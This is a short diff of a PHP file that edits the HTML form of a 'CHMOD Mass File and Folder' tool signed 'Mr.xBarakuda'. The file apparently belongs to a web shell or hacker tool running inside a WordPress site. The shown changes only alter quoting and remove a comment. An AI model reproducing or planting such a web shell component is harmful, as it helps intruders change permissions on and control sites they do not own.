@@ -1009,8 +1009,6 @@ if (!isset($_POST['code'])) {
   Code by Mr.xBarakuda
   v1.1
   */
-
-  // inisialisasi variabel gan
   $dosPerm = "0";
   $ficPerm = "0";
   $retval = "0"; // jumlah error CHMOD gan
@@ -1034,14 +1032,14 @@ if (!isset($_POST['code'])) {
 
   print "<center><h3>CHMOD Mass File and Folder by Mr.xBarakuda</h3>";
   print "<table><tr><td>";
-  print "<form method='post'>";
+  print "<form method=\"post\">";
   print "<tr><td>Hak Folder: </td>";
-  print "<td><select name='dir1'><option value='5'>5</option><option value='7' selected>7</option></select><select name='dir2'><option value='0'>0</option><option value='5' selected>5</option><option value='7'>7</option></select><select name='dir3'><option value='0'>0</option><option value='5' selected>5</option><option value='7'>7</option></select></td></tr>";
+  print "<td><select name=\"dir1\"><option value=\"5\">5</option><option value=\"7\" selected>7</option></select><select name=\"dir2\"><option value=\"0\">0</option><option value=\"5\" selected>5</option><option value=\"7\">7</option></select><select name=\"dir3\"><option value=\"0\">0</option><option value=\"5\" selected>5</option><option value=\"7\">7</option></select></td></tr>";
   print "<tr><td>Hak File: </td>";
-  print "<td><select name='fic1'><option value='4'>4</option><option value='6' selected>6</option></select><select name='fic2'><option value='0'>0</option><option value='4' selected>4</option><option value='6'>6</option></select><select name='fic3'><option value='0'>0</option><option value='4' selected>4</option><option value='6'>6</option></select></td></tr>";
+  print "<td><select name=\"fic1\"><option value=\"4\">4</option><option value=\"6\" selected>6</option></select><select name=\"fic2\"><option value=\"0\">0</option><option value=\"4\" selected>4</option><option value=\"6\">6</option></select><select name=\"fic3\"><option value=\"0\">0</option><option value=\"4\" selected>4</option><option value=\"6\">6</option></select></td></tr>";
   print "<tr><td>CWD =></td>";
-  print "<td><input type='text' name='chemin' maxlength='30' size='30' value='" . ABSPATH . "/'></td></tr>";
-  print "<tr><td> </td><td><input type='submit' value='Change Permissions!'>";
+  print "<td>" . ABSPATH . "<input type=\"text\" name=\"chemin\" maxlength=\"30\" size=\"30\" value=\"/\" ></td></tr>";
+  print "<tr><td> </td><td><input type=\"submit\" value=\" Change Permissions! \">";
   print "</td></tr></form></td></tr></table></center>";
   if (($dosPerm || $ficPerm) > 0) {
 
